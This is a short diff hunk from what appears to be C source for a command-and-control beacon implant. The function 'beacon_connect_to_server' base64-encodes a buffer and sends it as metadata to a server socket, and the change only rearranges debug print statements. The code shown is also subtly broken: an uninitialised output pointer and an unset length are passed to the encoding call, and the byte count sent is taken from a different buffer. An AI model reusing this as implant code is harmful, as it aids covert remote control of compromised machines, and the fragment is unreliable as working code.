@@ -66,12 +66,13 @@ void beacon_connect_to_server(char IP[16], int PORT){
     DWORD strcount;
     char *UUID_BUFFER;
     BOOL res = CryptBinaryToStringA(sendbuf, 128, 1, UUID_BUFFER, &strcount);
-    printf("\nBASE64\n");
+    //printf("\nBASE64\n");
 
     //// Send metadata
-    printf("\nSENDBUF\n");
+    
     printf("\n%s\n", UUID_BUFFER);
     send_all(s, UUID_BUFFER, (int)strlen(sendbuf)); 
+    printf("\nSENDBUF\n");
   
     
     
